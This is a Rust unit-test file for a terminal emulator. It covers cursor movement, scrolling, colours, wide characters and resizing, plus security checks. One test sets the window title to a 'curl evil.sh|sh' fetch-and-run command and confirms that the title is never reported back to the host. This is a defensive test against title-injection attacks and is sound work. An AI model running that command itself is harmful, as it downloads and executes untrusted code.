use super::*;

fn emu(cols: usize, rows: usize) -> Emulator {
    Emulator::new(cols, rows, Scheme::Vga)
}

fn text(e: &Emulator, y: usize) -> String {
    e.term.screen_row(y).text()
}

#[test]
fn prints_and_wraps() {
    let mut e = emu(10, 3);
    e.feed(b"hello world!");
    assert_eq!(text(&e, 0), "hello worl");
    assert_eq!(text(&e, 1), "d!");
    assert!(e.term.screen_row(0).wrapped);
    assert_eq!((e.term.cursor.x, e.term.cursor.y), (2, 1));
}

#[test]
fn pending_wrap_at_last_column() {
    let mut e = emu(5, 2);
    e.feed(b"abcde");
    assert_eq!((e.term.cursor.x, e.term.cursor.y), (4, 0));
    assert!(e.term.cursor.wrap_pending);
    e.feed(b"\r\n");
    assert_eq!((e.term.cursor.x, e.term.cursor.y), (0, 1));
    assert_eq!(text(&e, 1), "");
}

#[test]
fn scrolls_into_scrollback() {
    let mut e = emu(10, 3);
    e.feed(b"1\r\n2\r\n3\r\n4\r\n5");
    assert_eq!(text(&e, 0), "3");
    assert_eq!(text(&e, 2), "5");
    assert_eq!(e.term.scrollback_len(), 2);
    assert_eq!(e.term.line(0).unwrap().text(), "1");
}

#[test]
fn cursor_movement_and_erase() {
    let mut e = emu(10, 5);
    e.feed(b"\x1b[3;4HX");
    assert_eq!(e.term.screen_row(2).cells[3].ch, 'X');
    e.feed(b"\x1b[1;1Habcdef\x1b[1;3H\x1b[K");
    assert_eq!(text(&e, 0), "ab");
    e.feed(b"\x1b[2J");
    for y in 0..5 {
        assert_eq!(text(&e, y), "");
    }
}

#[test]
fn sgr_colors() {
    let mut e = emu(10, 2);
    e.feed(b"\x1b[1;31;44mA\x1b[38;5;200mB\x1b[38;2;1;2;3mC\x1b[38:2::4:5:6mD\x1b[0mE");
    let row = e.term.screen_row(0);
    assert_eq!(row.cells[0].fg, Color::Indexed(1));
    assert_eq!(row.cells[0].bg, Color::Indexed(4));
    assert!(row.cells[0].flags.contains(Flags::BOLD));
    assert_eq!(row.cells[1].fg, Color::Indexed(200));
    assert_eq!(row.cells[2].fg, Color::Rgb(1, 2, 3));
    assert_eq!(row.cells[3].fg, Color::Rgb(4, 5, 6));
    assert_eq!(row.cells[4].fg, Color::Default);
    assert_eq!(row.cells[4].flags, Flags::default());
}

#[test]
fn scroll_region() {
    let mut e = emu(5, 5);
    e.feed(b"a\r\nb\r\nc\r\nd\r\ne");
    e.feed(b"\x1b[2;4r\x1b[4;1H\n");
    assert_eq!(text(&e, 0), "a");
    assert_eq!(text(&e, 1), "c");
    assert_eq!(text(&e, 2), "d");
    assert_eq!(text(&e, 3), "");
    assert_eq!(text(&e, 4), "e");
    assert_eq!(e.term.scrollback_len(), 0);
}

#[test]
fn insert_delete_lines_and_chars() {
    let mut e = emu(6, 3);
    e.feed(b"abcdef\x1b[1;3H\x1b[2P");
    assert_eq!(text(&e, 0), "abef");
    e.feed(b"\x1b[1;2H\x1b[1@");
    assert_eq!(text(&e, 0), "a bef");
    e.feed(b"\x1b[2;1Hxyz\x1b[1;1H\x1b[L");
    assert_eq!(text(&e, 0), "");
    assert_eq!(text(&e, 1), "a bef");
    assert_eq!(text(&e, 2), "xyz");
    e.feed(b"\x1b[M");
    assert_eq!(text(&e, 0), "a bef");
}

#[test]
fn alt_screen_roundtrip() {
    let mut e = emu(10, 3);
    e.feed(b"primary");
    e.feed(b"\x1b[?1049h");
    assert!(e.term.alt_screen());
    assert_eq!(text(&e, 0), "");
    e.feed(b"alt");
    e.feed(b"\x1b[?1049l");
    assert_eq!(text(&e, 0), "primary");
    assert_eq!((e.term.cursor.x, e.term.cursor.y), (7, 0));
}

#[test]
fn wide_chars() {
    let mut e = emu(5, 2);
    e.feed("日本x".as_bytes());
    let row = e.term.screen_row(0);
    assert!(row.cells[0].flags.contains(Flags::WIDE));
    assert!(row.cells[1].flags.contains(Flags::WIDE_SPACER));
    assert_eq!(row.cells[2].ch, '本');
    assert_eq!(row.cells[4].ch, 'x');
    assert_eq!(text(&e, 0), "日本x");
    // A wide char that doesn't fit wraps to the next line.
    let mut e = emu(3, 2);
    e.feed("ab日".as_bytes());
    assert_eq!(text(&e, 0), "ab");
    assert_eq!(text(&e, 1), "日");
}

#[test]
fn dec_special_graphics() {
    let mut e = emu(10, 1);
    e.feed(b"\x1b(0lqk\x1b(Bq");
    assert_eq!(text(&e, 0), "┌─┐q");
}

#[test]
fn cp437_encoding() {
    let mut e = emu(10, 1);
    e.encoding = Encoding::Cp437;
    e.feed(&[0xC9, 0xCD, 0xBB, b' ', 0xB0, 0xB1, 0xB2, 0xDB]);
    assert_eq!(text(&e, 0), "╔═╗ ░▒▓█");
}

#[test]
fn device_reports() {
    let mut e = emu(80, 24);
    e.feed(b"\x1b[5;10H\x1b[6n\x1b[c");
    assert_eq!(e.term.responses, b"\x1b[5;10R\x1b[?62;1;6;22c");
}

#[test]
fn osc_title_and_palette_query() {
    let mut e = emu(10, 2);
    e.feed(b"\x1b]0;my title\x07");
    assert_eq!(e.term.title, "my title");
    e.feed(b"\x1b]4;1;?\x07");
    assert_eq!(e.term.responses, b"\x1b]4;1;rgb:aaaa/0000/0000\x07");
}

#[test]
fn tabs() {
    let mut e = emu(20, 1);
    e.feed(b"a\tb");
    assert_eq!(e.term.screen_row(0).cells[8].ch, 'b');
    e.feed(b"\x1b[3g\r\x1b[4C\x1bH\r\tc");
    assert_eq!(e.term.screen_row(0).cells[4].ch, 'c');
}

#[test]
fn resize_keeps_cursor_line() {
    let mut e = emu(10, 5);
    e.feed(b"1\r\n2\r\n3\r\n4\r\n5");
    e.term.resize(10, 3);
    assert_eq!(text(&e, 2), "5");
    assert_eq!(e.term.cursor.y, 2);
    e.term.resize(10, 5);
    assert_eq!(text(&e, 0), "1");
    assert_eq!(text(&e, 4), "5");
}

#[test]
fn bbs_clear_homes_cursor() {
    let mut e = emu(10, 3);
    e.term.bbs_mode = true;
    e.feed(b"\x1b[3;5H\x1b[2J");
    assert_eq!((e.term.cursor.x, e.term.cursor.y), (0, 0));
}

#[test]
fn rep_repeats_last_char() {
    let mut e = emu(10, 1);
    e.feed(b"x\x1b[4b");
    assert_eq!(text(&e, 0), "xxxxx");
}

#[test]
fn origin_mode() {
    let mut e = emu(10, 6);
    e.feed(b"\x1b[3;5r\x1b[?6h\x1b[1;1HA\x1b[10;1HB");
    assert_eq!(text(&e, 2), "A");
    assert_eq!(text(&e, 4), "B");
}

#[test]
fn throughput_smoke() {
    // Not a benchmark, but makes sure big inputs don't do anything silly.
    let mut e = emu(120, 40);
    let mut data = Vec::new();
    for i in 0..20_000 {
        data.extend_from_slice(format!("\x1b[3{}mline {i} with some text in it\r\n", i % 8).as_bytes());
    }
    e.feed(&data);
    assert_eq!(e.term.scrollback_len(), 10_000);
}

#[test]
fn title_is_never_reported_back() {
    let mut e = emu(20, 3);
    e.feed(b"\x1b]2;curl evil.sh|sh\x07\x1b[21t");
    assert_eq!(e.term.title, "curl evil.sh|sh");
    assert!(e.term.responses.is_empty());
    e.feed(b"\x1b[18t");
    assert_eq!(e.term.responses, b"\x1b[8;3;20t");
}

#[test]
fn osc_strings_are_bounded() {
    let mut e = emu(20, 3);
    e.feed(b"\x1b]2;");
    let chunk = vec![b'y'; 1 << 20];
    for _ in 0..4 {
        e.feed(&chunk);
    }
    e.feed(b"\x07ok");
    assert!(e.term.title.len() <= OSC_MAX, "title is {} bytes", e.term.title.len());
    assert_eq!(text(&e, 0), "ok");
}

#[test]
fn resize_in_alt_screen_keeps_primary_screen() {
    let mut e = emu(40, 20);
    e.feed(b"one\r\ntwo\r\nthree\r\n$ ");
    e.feed(b"\x1b[?1049h");
    e.term.resize(40, 10);
    e.term.resize(40, 30);
    e.feed(b"\x1b[?1049l");
    assert_eq!(text(&e, 0), "one");
    assert_eq!(text(&e, 3), "$");
    assert_eq!((e.term.cursor.x, e.term.cursor.y), (2, 3));
}

#[test]
fn shrinking_in_alt_screen_spills_primary_into_scrollback() {
    let mut e = emu(10, 6);
    for i in 0..6 {
        e.feed(format!("L{i}\r\n").as_bytes());
    }
    // The cursor is on the last row, so shrinking must keep it visible.
    e.feed(b"$\x1b[?1049h");
    e.term.resize(10, 3);
    e.feed(b"\x1b[?1049l");
    assert_eq!(text(&e, 2), "$");
    assert_eq!(e.term.cursor.y, 2);
    assert_eq!(e.term.line(e.term.scrollback_len() - 1).unwrap().text(), "L3");
}

#[test]
fn ed3_clears_only_scrollback() {
    let mut e = emu(10, 2);
    e.feed(b"a\r\nb\r\nkeep\x1b[3J");
    assert_eq!(e.term.scrollback_len(), 0);
    assert_eq!(text(&e, 1), "keep");
}

#[test]
fn insert_delete_on_right_half_of_wide_char() {
    for seq in [&b"\x1b[P"[..], b"\x1b[@"] {
        let mut e = emu(10, 1);
        e.feed("ab日cd".as_bytes());
        e.feed(b"\x1b[4G");
        e.feed(seq);
        let row = e.term.screen_row(0);
        for (x, c) in row.cells.iter().enumerate() {
            if c.flags.contains(Flags::WIDE) {
                assert!(row.cells[x + 1].flags.contains(Flags::WIDE_SPACER), "{seq:?}: orphan wide at {x}");
            }
        }
    }
}

#[test]
fn lowering_scrollback_limit_trims() {
    let mut e = emu(10, 2);
    for i in 0..100 {
        e.feed(format!("{i}\r\n").as_bytes());
    }
    e.term.scrollback_limit = 10;
    e.feed(b"x\r\n");
    assert_eq!(e.term.scrollback_len(), 10);
}

#[test]
fn rep_is_capped() {
    let mut e = emu(10, 3);
    e.feed(b"a\x1b[65535b");
    assert_eq!(e.term.scrollback_len(), 0);
}
